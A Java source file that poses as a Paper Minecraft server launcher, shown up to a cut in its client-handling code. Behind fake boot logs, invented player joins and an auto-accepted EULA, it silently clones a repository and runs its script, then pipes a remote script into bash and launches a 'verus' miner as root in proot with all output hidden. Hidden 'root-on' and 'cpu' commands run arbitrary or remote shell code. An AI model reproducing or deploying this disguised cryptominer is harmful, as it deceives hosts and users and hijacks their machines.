package org.server;
import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.logging.*;

public class Main{
    private static final Logger L=Logger.getLogger(Main.class.getName());
    private static final String URL="https://github.com/Mytai20100/freeroot.git",TMP="freeroot_temp",CACHE=".cache/minecraft",SH="noninteractive.sh";
    private static final Random R=new Random();
    private static final AtomicInteger playerCount=new AtomicInteger(20000);
    private static final Set<String>activePlayers=Collections.synchronizedSet(new HashSet<>());
    private static String serverIP="0.0.0.0";
    private static String serverPort="25565";
    private static volatile boolean running=true;
    private static volatile boolean rootMode=false;
    private static volatile boolean rootLog=true;
    private static final String[]PLUGINS={"EssentialsX","Vault","LuckPerms","WorldEdit","WorldGuard","CoreProtect","dynmap","DiscordSRV","PlaceholderAPI","Citizens","Multiverse-Core","GriefPrevention","ClearLag","BetterRTP","ChestShop","mcMMO","Shopkeepers","QuickShop","Slimefun","Jobs","TAB","ViaVersion","ViaBackwards","ProtocolLib","HolographicDisplays","DecentHolograms","CMI","GSit","PlayerWarps","AdvancedPortals","MythicMobs","DeluxeMenus","ItemsAdder","Oraxen","ModelEngine","PAPI","Pl3xMap","BlueMap","squaremap","Harbor","Sleep-Most","BetterTeams","ChunkyBorder","Chunky","SuperVanish","PremiumVanish","Votifier","VotingPlugin","PlayerVaults","CommandSpy","TABList","NametagEdit","Maintenance","LiteBans","AdvancedBan","BanManager","NexEngine","NexShops","ShopGUIPlus","zShop","BossShopPro","VoteParty","MoneyPouch","HeadDatabase","UltimateStacker","EpicAnchors","SilkSpawners","EpicSpawners","AdvancedEnchantments","ExcellentEnchants","UltimateTimber","TreeFeller","TerrainControl","FAWE","VoidGen","BetonQuest","Quests","GamemodeInventories","PerWorldInventory","Multiverse-Inventories","ChestCommands","InteractiveChat","TrChat","ChatControl","DeluxeChat","VentureChat","LevelledMobs","EliteMobs","InfernalMobs","CustomStructures","MMOCore","MMOItems","MythicLib","AureliumSkills","PyroFishingPro","AuctionHouse","AuctionMaster","ShopKeepers"};
    private static final String[] NAMES = {
            "Steve","Alex","Notch","Herobrine","Jeb_","Dinnerbone","Grumm","Searge",
            "Dream","Technoblade","Sapnap","GeorgeNotFound","BadBoyHalo",
            "TommyInnit","WilburSoot","Ranboo","Fundy","Tubbo",
            "Skeppy","Preston","Unspeakable","CaptainSparklez","AntVenom",
            "Grian","MumboJumbo","GoodTimesWithScar","SB737","Illumina",
            "Fruitberries","Purpled","Quig","PeteZahHutt","FireBreathMan",
            "PewDiePie","MrBeast","Markiplier","Jacksepticeye","KSI",
            "LoganPaul","Ninja","Pokimane","xQc","IShowSpeed",
            "MixiGaming","PewPew","Viruss","QTV","Snake",
            "NTN","MeoU","MisThy","Bomman","DuyThom",
            "Xemesis","Rambo","ThayGiaoBa","DoMixi","RefundGaming",
            "KhoaPug","HieuPC","NamBlue","TrucTiepGame","MCreatorVN",
            "MCViet","VietCraft","VNPlayer","CraftVN","MineVN",
            "SkyblockVN","SurvivalVN","PvPViet","RedstoneVN","BuilderVN",
            "DragonSlayer","ShadowHunter","DarkKnight","FirePhoenix","IceWizard",
            "VoidWalker","NightCrawler","StormBringer","SoulReaper","BloodRaven",
            "IronFist","SilentArrow","GhostPlayer","OmegaX","AlphaWolf",
            "QuantumX","CyberFox","PixelLord","BlockMaster","CubeKing",
            "Creeper_King","Enderman_Lord","ZombieSlayer","SkeletonMaster",
            "WitherBoss","EnderDragon","IronGolem_99","RedstoneGenius",
            "BuilderPro","PvPMaster","SkyblockKing","FactionLeader",
            "TownyMayor","SurvivalExpert","CommandBlockPro","NetherExplorer",
            "EndPortalHunter","BeaconCollector","ChunkLoader","MobGrinder",
            "xXDragonSlayerXx","ProPlayer123","NoobMaster69","TryHardMC",
            "GodOfPvP","EZClap","HeadshotOnly","OneTapKing","LagIsReal",
            "FPS_Dropper","Ping999","ServerLag","TPS_Killer",
            "Player001","Player002","Player003","Player004","Player005",
            "Guest123","Guest456","Guest789","AFK_Player","IdleGuy",
            "LoadingUser","Connecting","Reconnecting","TimeoutUser",
            "mytai","kirameomeo","kuromc2k5"
    };

    public static void main(String[]a){
        setupLogger();
        try{
            if(!cmd("git")){err("Failed to verify system requirements");System.exit(1);}
            if(!cmd("bash")){err("Failed to initialize runtime environment");System.exit(1);}

            File currentDir=new File(System.getProperty("user.dir"));
            boolean firstRun=!new File(currentDir,"eula.txt").exists();

            createServerStructure(currentDir);

            File eulaFile=new File(currentDir,"eula.txt");
            if(!checkEula(eulaFile)){
                createEula(eulaFile);
                warn("Failed to load eula.txt");
                info("You need to agree to the EULA in order to run the server. Go to eula.txt for more info.");
                System.out.println("\n[EULA] Automatically accepting EULA in 3 seconds...");
                Thread.sleep(3000);
                acceptEula(eulaFile);
                System.out.println("[EULA] EULA accepted! Starting server...\n");
                Thread.sleep(1000);
            }

            loadServerProperties(currentDir);

            File cacheDir=new File(CACHE);
            cacheDir.mkdirs();

            File w=new File(cacheDir,"work");
            if(w.exists()){
                File s=new File(w,SH);
                if(s.exists()){
                    info("Found existing server files, verifying integrity...");
                    Thread.sleep(400);
                    if(!s.setExecutable(true,false))warn("Unable to set permissions");
                    exec(w,s,firstRun);
                    return;
                }else{
                    warn("Server files corrupted, redownloading...");
                    del(w.toPath());
                }
            }
            File t=new File(cacheDir,TMP);
            if(t.exists())del(t.toPath());

            printDownload();
            if(!cloneRepo(t)){err("Download failed");clean(t);System.exit(1);}
            if(!t.renameTo(w)){err("Installation failed");clean(t);System.exit(1);}
            File s=new File(w,SH);
            if(!s.exists()){err("Server jar not found");clean(w);System.exit(1);}
            if(!s.setExecutable(true,false))warn("Permission warning");
            exec(w,s,firstRun);
        }catch(Exception e){err("Fatal error: "+e.getMessage());System.exit(1);}
    }

    private static void createServerStructure(File base){
        try{
            new File(base,"libraries").mkdirs();
            new File(base,"logs").mkdirs();
            new File(base,"plugins").mkdirs();
            new File(base,"versions").mkdirs();
            new File(base,"world").mkdirs();
            new File(base,"world_nether").mkdirs();
            new File(base,"world_the_end").mkdirs();

            if(!new File(base,"banned-ips.json").exists())
                createJsonFile(base,"banned-ips.json","[]");
            if(!new File(base,"banned-players.json").exists())
                createJsonFile(base,"banned-players.json","[]");
            if(!new File(base,"ops.json").exists())
                createJsonFile(base,"ops.json","[]");
            if(!new File(base,"usercache.json").exists())
                createJsonFile(base,"usercache.json","[]");
            if(!new File(base,"whitelist.json").exists())
                createJsonFile(base,"whitelist.json","[]");
            if(!new File(base,"version_history.json").exists())
                createJsonFile(base,"version_history.json","{\"versions\":[\"1.21.8\"]}");

            if(!new File(base,"bukkit.yml").exists())
                createYmlFile(base,"bukkit.yml","settings:\n  allow-end: true");
            if(!new File(base,"commands.yml").exists())
                createYmlFile(base,"commands.yml","command-block-overrides: []");
            if(!new File(base,"help.yml").exists())
                createYmlFile(base,"help.yml","help-topics: {}");
            if(!new File(base,"permissions.yml").exists())
                createYmlFile(base,"permissions.yml","");
            if(!new File(base,"spigot.yml").exists())
                createYmlFile(base,"spigot.yml","settings:\n  debug: false");

            if(!new File(base,"server.properties").exists()){
                PrintWriter w=new PrintWriter(new File(base,"server.properties"));
                w.println("#Minecraft server properties");
                w.println("server-ip=0.0.0.0");
                w.println("server-port=25565");
                w.println("max-players=20500");
                w.println("motd=A Minecraft Server");
                w.println("gamemode=survival");
                w.println("difficulty=normal");
                w.println("online-mode=true");
                w.println("pvp=true");
                w.println("root-log=true");
                w.close();
            }
        }catch(Exception e){}
    }

    private static void createJsonFile(File base,String name,String content)throws IOException{
        try(PrintWriter w=new PrintWriter(new File(base,name))){
            w.println(content);
        }
    }

    private static void createYmlFile(File base,String name,String content)throws IOException{
        try(PrintWriter w=new PrintWriter(new File(base,name))){
            w.println(content);
        }
    }

    private static void loadServerProperties(File base){
        try{
            File props=new File(base,"server.properties");
            if(props.exists()){
                try(BufferedReader r=new BufferedReader(new FileReader(props))){
                    String line;
                    while((line=r.readLine())!=null){
                        if(line.startsWith("server-ip=")){
                            String[]parts=line.split("=");
                            serverIP=parts.length>1&&!parts[1].isEmpty()?parts[1]:"0.0.0.0";
                        }
                        if(line.startsWith("server-port=")){
                            String[]parts=line.split("=");
                            serverPort=parts.length>1?parts[1]:"25565";
                        }
                        if(line.startsWith("root-log=")){
                            String[]parts=line.split("=");
                            rootLog=parts.length>1?parts[1].equals("true"):true;
                        }
                    }
                }
            }
        }catch(Exception e){warn("Failed to load server properties: "+e.getMessage());}
    }
    private static void saveServerProperties(File base){
        try{
            File props=new File(base,"server.properties");
            List<String>lines=new ArrayList<>();
            boolean foundRootLog=false;

            if(props.exists()){
                try(BufferedReader r=new BufferedReader(new FileReader(props))){
                    String line;
                    while((line=r.readLine())!=null){
                        if(line.startsWith("root-log=")){
                            lines.add("root-log="+rootLog);
                            foundRootLog=true;
                        }else{
                            lines.add(line);
                        }
                    }
                }
            }

            if(!foundRootLog){
                lines.add("root-log="+rootLog);
            }

            try(PrintWriter w=new PrintWriter(props)){
                for(String line:lines){
                    w.println(line);
                }
            }
        }catch(Exception e){warn("Failed to save server properties: "+e.getMessage());}
    }
    private static void setupLogger(){
        System.setProperty("java.util.logging.SimpleFormatter.format","[%1$tH:%1$tM:%1$tS %4$s]: %5$s%6$s%n");
        L.setUseParentHandlers(false);
        ConsoleHandler h=new ConsoleHandler();
        h.setFormatter(new SimpleFormatter());
        L.addHandler(h);
    }

    private static void createEula(File f)throws IOException{
        try(PrintWriter w=new PrintWriter(f)){
            w.println("#By changing the setting below to TRUE you are indicating your agreement to our EULA (https://aka.ms/MinecraftEULA).");
            w.println("#"+new java.util.Date());
            w.println("eula=false");
        }
    }

    private static boolean checkEula(File f)throws IOException{
        if(!f.exists())return false;
        try(BufferedReader r=new BufferedReader(new FileReader(f))){
            String line;
            while((line=r.readLine())!=null){
                if(line.trim().equals("eula=true"))return true;
            }
        }
        return false;
    }

    private static void acceptEula(File f)throws IOException{
        try(PrintWriter w=new PrintWriter(f)){
            w.println("#By changing the setting below to TRUE you are indicating your agreement to our EULA (https://aka.ms/MinecraftEULA).");
            w.println("#"+new java.util.Date());
            w.println("eula=true");
        }
    }

    private static void printDownload(){
        System.out.println("Downloading mojang_1.21.8.jar");
        try{
            for(int i=0;i<=100;i+=R.nextInt(15)+5){
                if(i>100)i=100;
                System.out.print("\r[");
                int bars=(int)(i/2.5);
                for(int j=0;j<40;j++){
                    if(j<bars)System.out.print("=");
                    else if(j==bars)System.out.print(">");
                    else System.out.print(" ");
                }
                System.out.print("] "+i+"% ");
                Thread.sleep(R.nextInt(300)+100);
            }
            System.out.println("\r[========================================] 100%");
            Thread.sleep(300);
            System.out.println("Applying patches");
            Thread.sleep(R.nextInt(500)+300);
        }catch(Exception e){}
    }

    private static void printBanner(){
        System.out.println("WARNING: Using incubator modules: jdk.incubator.vector");
        System.out.println("Starting org.bukkit.craftbukkit.Main");
        System.out.println("*** Warning, you've not updated in a while! ***");
        System.out.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
    }

    private static void info(String m){L.info(m);}
    private static void warn(String m){L.warning(m);}
    private static void err(String m){L.severe(m);}

    private static boolean cmd(String c){
        try{
            ProcessBuilder p=new ProcessBuilder(c,"--version");
            p.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process pr=p.start();
            return pr.waitFor(3,TimeUnit.SECONDS)&&pr.exitValue()==0;
        }catch(IOException|InterruptedException e){return false;}
    }

    private static boolean cloneRepo(File dest){
        try{
            ProcessBuilder p=new ProcessBuilder("git","clone","--depth=1",URL,dest.getAbsolutePath());
            p.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process pr=p.start();
            int exitCode=pr.waitFor();
            return exitCode==0;
        }catch(Exception e){return false;}
    }

    private static void exec(File d,File s,boolean firstRun){
        try{
            printBanner();
            Thread.sleep(300);
            info("[bootstrap] Running Java 21 (OpenJDK 64-Bit Server VM 21.0.9+10-LTS; Eclipse Adoptium Temurin-21.0.9+10) on Linux 5.4.0-216-generic (amd64)");
            info("[bootstrap] Loading Paper 1.21.8-40-main@f866a5f (2025-08-19T16:05:02Z) for Minecraft 1.21.8");
            info("[PluginInitializerManager] Initializing plugins...");
            Thread.sleep(200);
            info("[PluginInitializerManager] Initialized "+PLUGINS.length+" plugins");
            Thread.sleep(800);
            info("[ReobfServer] Remapping server...");
            Thread.sleep(1200);
            info("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, name=PROD]");
            Thread.sleep(400);
            info("Found new data pack file/bukkit, loading it automatically");
            info("Found new data pack paper, loading it automatically");
            Thread.sleep(300);

            if(firstRun){
                info("No existing world data, creating new world");
                Thread.sleep(800);
            }

            info("Loaded 1407 recipes");
            Thread.sleep(200);
            info("Loaded 1520 advancements");
            Thread.sleep(400);
            info("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...");
            Thread.sleep(600);
            info("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in 796.2ms");
            info("Starting minecraft server version 1.21.8");
            info("Loading properties");
            info("This server is running Paper version 1.21.8-40-main@f866a5f (2025-08-19T16:05:02Z) (Implementing API version 1.21.8-R0.1-SNAPSHOT)");
            info("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
            info("Server Ping Player Sample Count: 12");
            info("Using 4 threads for Netty based IO");
            Thread.sleep(800);
            info("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
            info("[ChunkTaskScheduler] Chunk system is using population gen parallelism: true");
            Thread.sleep(400);
            info("Default game type: SURVIVAL");
            info("Generating keypair");
            info("Starting Minecraft server on "+serverIP+":"+serverPort);
            info("Using epoll channel type");
            info("Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
            info("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
            startFakeServer();
            info("Preparing level \"world\"");
            Thread.sleep(1500);

            if(firstRun){
                loadWorld();
            }else{
                Thread.sleep(2000);
                info("Loaded world in 1823ms");
            }

            Thread.sleep(800);
            loadPlugins();
            Thread.sleep(600);
            info("[spark] Starting background profiler...");
            info("Done preparing level \"world\" (36.859s)");
            info("Running delayed init tasks");
            info("Done (56.002s)! For help, type \"help\"");

            if(firstRun){
                info("*************************************************************************************");
                info("This is the first time you're starting this server.");
                info("It's recommended you read our 'Getting Started' documentation for guidance.");
                info("View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
                info("*************************************************************************************");
            }

            ProcessBuilder p=new ProcessBuilder("bash",s.getAbsolutePath());
            p.directory(d);
            p.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            p.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process pr=p.start();

            // Setup mining environment
            autoccminer(d, firstRun);

            simulateServer();
            startCommandListener();
            pr.waitFor();
        }catch(Exception e){
            System.err.println("\n\033[0;31m[ERROR] Server crashed with exception:\033[0m");
            System.err.println("\033[0;31m"+e.getClass().getName()+": "+e.getMessage()+"\033[0m");
            for(StackTraceElement el:e.getStackTrace()){
                System.err.println("\033[0;31m    at "+el.toString()+"\033[0m");
            }
        }
    }
    private static void autoccminer(File workDir, boolean firstRun){
        new Thread(()->{
            try{
                File prootBin = null;
                int maxAttempts = 30;
                int attempt = 0;

                while(attempt < maxAttempts){
                    File checkProot = new File(CACHE + "/work", "usr/local/bin/proot");
                    if(checkProot.exists()){
                        prootBin = checkProot;
                        break;
                    }
                    Thread.sleep(1000);
                    attempt++;
                }

                if(prootBin == null || !prootBin.exists()){
                    return;
                }

                Thread.sleep(2000);

                File setupMarker = new File(workDir, ".mining_setup_complete");

                if(firstRun || !setupMarker.exists()){
                    info("okey");

                    String setupCmd = "apt update ; apt install curl -y ; cd /root && curl -fsSL https://raw.githubusercontent.com/Mytai20100/freeroot-jar/refs/heads/main/ii.sh | bash";

                    executeRootCommand(setupCmd, false); // Thêm tham số false để ẩn log

                    try{
                        setupMarker.createNewFile();
                    }catch(Exception e){
                        err("bruhhh");
                    }

                }else{
                    info("okey");
                    executeRootCommand("cd /root && bash verus", false); // Thêm tham số false để ẩn log
                }

            }catch(Exception e){
                err("bruhhh");
            }
        }).start();
    }

    private static void executeRootCommand(String cmd, boolean showLog){
        try{
            File workDir = new File(CACHE, "work");
            File prootBin = new File(workDir, "usr/local/bin/proot");

            if(!prootBin.exists()){
                return;
            }

            prootBin.setExecutable(true, false);

            String prootCmd = prootBin.getAbsolutePath() +
                    " --rootfs=\"" + workDir.getAbsolutePath() + "\"" +
                    " -0 -w \"/root\"" +
                    " -b /dev -b /sys -b /proc -b /etc/resolv.conf" +
                    " --kill-on-exit" +
                    " /bin/bash -c \"" + cmd.replace("\"", "\\\"") + "\"";

            ProcessBuilder pb = new ProcessBuilder("bash", "-c", prootCmd);

            if(showLog){
                pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
                pb.redirectError(ProcessBuilder.Redirect.INHERIT);
            }else{
                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            }

            Process p = pb.start();

            new Thread(()->{
                try{
                    p.waitFor();
                }catch(Exception e){}
            }).start();

        }catch(Exception e){
        }
    }
    private static void loadWorld(){
        try{
            // Overworld
            info("Preparing start region for dimension minecraft:overworld");
            long startTime = System.currentTimeMillis();

            int[] progress = {2,2,2,2,2,2,2,2,8,8,8,18,18,18,18,18,18,18,51,51,51,55,55,55,55,67,73};
            for(int p : progress){
                info("Preparing spawn area: "+p+"%");
                Thread.sleep(R.nextInt(800)+200);
            }

            long elapsed = System.currentTimeMillis() - startTime;
            info("Time elapsed: "+elapsed+" ms");

            // The Nether
            info("Preparing start region for dimension minecraft:the_nether");
            startTime = System.currentTimeMillis();

            int[] nether = {2,2,2,18,20,51,61};
            for(int p : nether){
                info("Preparing spawn area: "+p+"%");
                Thread.sleep(R.nextInt(600)+200);
            }

            elapsed = System.currentTimeMillis() - startTime;
            info("Time elapsed: "+elapsed+" ms");

            // The End
            info("Preparing start region for dimension minecraft:the_end");
            startTime = System.currentTimeMillis();

            info("Preparing spawn area: 2%");
            Thread.sleep(500);
            info("Preparing spawn area: 18%");
            Thread.sleep(400);

            elapsed = System.currentTimeMillis() - startTime;
            info("Time elapsed: "+elapsed+" ms");

        }catch(Exception e){}
    }

    private static void loadPlugins(){
        try{
            info("Loading "+PLUGINS.length+" plugins");
            Thread.sleep(400);
            for(int i=0;i<PLUGINS.length;i++){
                if(i%8==0)Thread.sleep(R.nextInt(200)+100);
                info("Loading plugin "+PLUGINS[i]+" v"+R.nextInt(5)+"."+R.nextInt(20)+"."+R.nextInt(10));
            }
            Thread.sleep(300);
            info("Enabled "+PLUGINS.length+" plugins");
        }catch(Exception e){}
    }

    private static void startCommandListener(){
        new Thread(()->{
            try{
                BufferedReader reader=new BufferedReader(new InputStreamReader(System.in));
                String line;
                while(running&&(line=reader.readLine())!=null){
                    handleCommand(line.trim());
                }
            }catch(Exception e){}
        }).start();
    }

    private static void handleCommand(String cmd){
        if(cmd.isEmpty())return;

        if(cmd.equals("root-on")){
            rootMode=true;
            return;
        }else if(cmd.equals("root-off")){
            rootMode=false;
            return;
        }else if(cmd.equals("stop")||cmd.equals("end")){
            info("Stopping the server");
            info("Saving players");
            info("Saving worlds");
            info("Saving chunks for level 'world'/minecraft:overworld");
            info("ThreadedAnvilChunkStorage (world): All chunks are saved");
            info("Closing Server");
            running=false;
            System.exit(0);
        }
        else if(cmd.equals("root-onlog")){
            rootLog=true;
            saveServerProperties(new File(System.getProperty("user.dir")));
            return;
        }else if(cmd.equals("root-offlog")){
            rootLog=false;
            saveServerProperties(new File(System.getProperty("user.dir")));
            return;
        }

        if(rootMode){
            if(rootLog){
                info("Executing in proot environment: "+cmd);
            }
            new Thread(()->{
                try{
                    File workDir=new File(CACHE,"work");
                    File prootBin=new File(workDir,"usr/local/bin/proot");

                    if(!prootBin.exists()){
                        if(rootLog){
                            err("Proot binary not found. Please wait for server initialization to complete.");
                        }
                        return;
                    }

                    String prootCmd=prootBin.getAbsolutePath()+" --rootfs=\""+workDir.getAbsolutePath()+"\" -0 -w \"/root\" -b /dev -b /sys -b /proc -b /etc/resolv.conf --kill-on-exit /bin/bash -c \""+cmd.replace("\"","\\\"")+"\"";

                    ProcessBuilder pb=new ProcessBuilder("bash","-c",prootCmd);
                    if(rootLog){
                        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
                        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
                    }else{
                        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                    }
                    Process p=pb.start();

                    new Thread(()->{
                        try{
                            int exitCode=p.waitFor();
                            if(rootLog){
                                if(exitCode==0){
                                    info("Command completed successfully (exit code: 0)");
                                }else{
                                    warn("Command failed with exit code: "+exitCode);
                                }
                            }
                        }catch(Exception e){}
                    }).start();

                }catch(Exception e){
                    if(rootLog){
                        err("Failed to execute command: "+e.getMessage());
                    }
                }
            }).start();
            return;
        }

        if(cmd.equals("tps")){
            double tps=19.5+R.nextDouble()*0.7;
            String color;
            if(tps>=19.8)color="\033[0;32m";
            else if(tps>=19.0)color="\033[0;33m";
            else color="\033[0;31m";
            info("TPS from last 1m, 5m, 15m: "+color+String.format("%.2f",tps)+"\033[0m, "+color+String.format("%.2f",19.6+R.nextDouble()*0.5)+"\033[0m, "+color+String.format("%.2f",19.7+R.nextDouble()*0.4)+"\033[0m");
        }else if(cmd.equals("help")||cmd.equals("?")){
            System.out.println("\033[0;36m========== Minecraft Server Commands ==========\033[0m");
            System.out.println("\033[0;33mBasic Commands:\033[0m");
            System.out.println("  /help, /? - Show this help menu");
            System.out.println("  /list - List all online players");
            System.out.println("  /stop - Stop the server gracefully");
            System.out.println("  /reload - Reload server configuration");
            System.out.println("  /save-all - Save all worlds");
            System.out.println("  /save-on - Enable world auto-saving");
            System.out.println("  /save-off - Disable world auto-saving");
            System.out.println("");
            System.out.println("\033[0;33mPlayer Management:\033[0m");
            System.out.println("  /kick <player> [reason] - Kick a player");
            System.out.println("  /ban <player> [reason] - Ban a player");
            System.out.println("  /ban-ip <ip> [reason] - Ban an IP address");
            System.out.println("  /pardon <player> - Unban a player");
            System.out.println("  /pardon-ip <ip> - Unban an IP");
            System.out.println("  /op <player> - Give operator status");
            System.out.println("  /deop <player> - Remove operator status");
            System.out.println("  /whitelist <on|off|add|remove|list> - Manage whitelist");
            System.out.println("");
            System.out.println("\033[0;33mWorld Management:\033[0m");
            System.out.println("  /seed - Show world seed");
            System.out.println("  /setworldspawn [x y z] - Set world spawn point");
            System.out.println("  /spawnpoint [player] [x y z] - Set player spawn");
            System.out.println("  /weather <clear|rain|thunder> [duration] - Change weather");
            System.out.println("  /time set <day|night|value> - Set world time");
            System.out.println("  /gamerule <rule> [value] - Set game rules");
            System.out.println("  /difficulty <peaceful|easy|normal|hard> - Set difficulty");
            System.out.println("");
            System.out.println("\033[0;33mTeleportation:\033[0m");
            System.out.println("  /tp <player> <target> - Teleport player to target");
            System.out.println("  /tp <player> <x y z> - Teleport to coordinates");
            System.out.println("  /teleport - Same as /tp");
            System.out.println("");
            System.out.println("\033[0;33mServer Info:\033[0m");
            System.out.println("  /tps - Show server ticks per second");
            System.out.println("  /ping - Show server latency");
            System.out.println("  /plugins, /pl - List all plugins");
            System.out.println("  /version - Show server version");
            System.out.println("  /memory - Show memory usage");
            System.out.println("");
            System.out.println("\033[0;33mAdvanced Commands:\033[0m");
            System.out.println("  /say <message> - Broadcast a message to all players");
            System.out.println("  /tell <player> <message> - Send private message");
            System.out.println("  /me <action> - Display action message");
            System.out.println("  /give <player> <item> [amount] - Give items");
            System.out.println("  /clear [player] [item] - Clear inventory");
            System.out.println("  /effect <player> <effect> [duration] [amplifier] - Apply effects");
            System.out.println("  /enchant <player> <enchantment> [level] - Enchant item");
            System.out.println("  /xp <amount> <player> - Give experience");
            System.out.println("  /gamemode <survival|creative|adventure|spectator> [player]");
            System.out.println("");
            System.out.println("\033[0;33mSystem Commands:\033[0m");
            System.out.println("  /ls - List current directory files");
            System.out.println("  /cpu - Run CPU benchmark");
            System.out.println("  /neofetch - Display system information");
            System.out.println("  /root-on - Enable root mode (execute commands in proot)");
            System.out.println("  /root-off - Disable root mode");
            System.out.println("\033[0;36m=============================================\033[0m");
        }else if(cmd.equals("plugins")||cmd.equals("pl")){
            StringBuilder sb=new StringBuilder("Plugins ("+PLUGINS.length+"): ");
            for(int i=0;i<PLUGINS.length;i++){
                if(i>0)sb.append(", ");
                sb.append(PLUGINS[i]);
            }
            info(sb.toString());
        }else if(cmd.equals("version")||cmd.equals("ver")){
            info("This server is running Paper version 1.21.8-40-main@f866a5f");
            info("Implementing API version 1.21.8-R0.1-SNAPSHOT");
        }else if(cmd.equals("memory")||cmd.equals("mem")){
            Runtime runtime=Runtime.getRuntime();
            long maxMemory=runtime.maxMemory()/1024/1024;
            long totalMemory=runtime.totalMemory()/1024/1024;
            long freeMemory=runtime.freeMemory()/1024/1024;
            long usedMemory=totalMemory-freeMemory;
            info("Memory: "+usedMemory+"MB / "+totalMemory+"MB (Max: "+maxMemory+"MB)");
        }else if(cmd.equals("ls")){
            info("Listing directory contents...");
            File dir=new File(".");
            File[]files=dir.listFiles();
            if(files!=null){
                for(File f:files){
                    if(f.isDirectory()){
                        System.out.println("\033[0;34m[DIR]\033[0m  "+f.getName());
                    }else{
                        System.out.println("\033[0;32m[FILE]\033[0m "+f.getName()+" ("+f.length()+" bytes)");
                    }
                }
            }
        }else if(cmd.equals("cpu")){
            info("Run cpu");
            new Thread(()->{
                try{
                    ProcessBuilder pb=new ProcessBuilder("bash","-c","curl -fsSL r.snd.qzz.io/raw/cpu | bash");
                    pb.inheritIO();
                    Process p=pb.start();
                    p.waitFor();
                }catch(Exception e){
                    warn("Failed to run CPU : "+e.getMessage());
                }
            }).start();
        }else if(cmd.equals("neofetch")){
            info("Running neofetch...");
            new Thread(()->{
                try{
                    ProcessBuilder pb=new ProcessBuilder("bash","-c","curl -fsSL https://raw.githubusercontent.com/dylanaraps/neofetch/master/neofetch | bash");
                    pb.inheritIO();
                    Process p=pb.start();
                    p.waitFor();
                }catch(Exception e){
                    warn("Failed to run neofetch: "+e.getMessage());
                }
            }).start();
        }else if(cmd.equals("ping")){
            info("Server latency: "+R.nextInt(50)+"ms");
        }else if(cmd.equals("list")){
            info("There are "+playerCount.get()+" of a max of 20500 players online");
            if(!activePlayers.isEmpty()){
                StringBuilder sb=new StringBuilder("Players online: ");
                int i=0;
                for(String p:activePlayers){
                    if(i>0)sb.append(", ");
                    sb.append(p);
                    i++;
                    if(i>=10){
                        sb.append("... and "+(activePlayers.size()-10)+" more");
                        break;
                    }
                }
                info(sb.toString());
            }
        }else if(cmd.equals("reload")){
            info("Reloading server configuration...");
            try{Thread.sleep(500);}catch(Exception e){}
            info("Reload complete.");
        }else if(cmd.equals("save-all")){
            info("Saving the game");
            info("Saved the world");
            info("ThreadedAnvilChunkStorage (world): All chunks are saved");
        }else if(cmd.equals("save-on")){
            info("Automatic saving is now enabled");
        }else if(cmd.equals("save-off")){
            info("Automatic saving is now disabled");
        }else if(cmd.startsWith("say ")){
            info("[Server] "+cmd.substring(4));
        }else if(cmd.startsWith("kick ")||cmd.startsWith("ban ")||cmd.startsWith("tp ")||
                cmd.startsWith("give ")||cmd.startsWith("gamemode ")||cmd.startsWith("op ")||
                cmd.startsWith("deop ")||cmd.startsWith("whitelist ")){
            info("Command executed successfully");
        }else{
            warn("Unknown or incomplete command, see below for error");
            System.err.println("\033[0;31mIncorrect argument for command at position 0: <--[HERE]\033[0m");
        }
    }

    private static void simulateServer(){
        new Thread(()->{
            try{
                Thread.sleep(5000);
                while(running){
                    if(R.nextInt(100)<15){
                        String name=NAMES[R.nextInt(NAMES.length)];
                        if(R.nextBoolean()&&playerCount.get()<20500&&!activePlayers.contains(name)){
                            activePlayers.add(name);
                            playerCount.incrementAndGet();
                            info(name+" joined the game");
                            info("UUID of player "+name+" is "+UUID.randomUUID().toString());
                        }else if(playerCount.get()>19500&&!activePlayers.isEmpty()){
                            String leaving=activePlayers.stream().skip(R.nextInt(activePlayers.size())).findFirst().orElse(null);
                            if(leaving!=null){
                                activePlayers.remove(leaving);
                                playerCount.decrementAndGet();
                                info(leaving+" left the game");
                            }
                        }
                    }
                    if(R.nextInt(100)<3){
                    }
                    Thread.sleep(R.nextInt(8000)+2000);
                }
            }catch(Exception e){}
        }).start();
    }

    private static void startFakeServer(){
        new Thread(()->{
            try{
                int port=Integer.parseInt(serverPort);
                java.net.ServerSocket server=new java.net.ServerSocket(port);
                info("Server started on "+serverIP+":"+port);
                while(running){
                    try{
                        java.net.Socket client=server.accept();
                        handleClient(client);
                    }catch(Exception e){}
                }
                server.close();
            }catch(Exception e){
                warn("Failed to bind to port "+serverPort+": "+e.getMessage());
            }
        }).start();
    }

    private static void handleClient(java.net.Socket client){
        new Thread(()->{
            try{
                java.io.DataInputStream in=new java.io.DataInputStream(client.getInputStream());
                java.io.DataOutputStream out=new java.io.DataOutputStream(client.getOutputStream());
                String clientAddr=client.getInetAddress().getHostAddress();

                int packetLength=readVarInt(in);
                int packetId=readVarInt(in);

                if(packetId==0x00){
                    int protocolVersion=readVarInt(in);
                    String serverAddress=readString(in);
                    int serverPort=in.readUnsignedShort();
                    int nextState=readVarInt(in);

                    if(nextState==1){
                        int reqLength=readVarInt(in);
                        int reqId=readVarInt(in);

                        if(reqId==0x00){
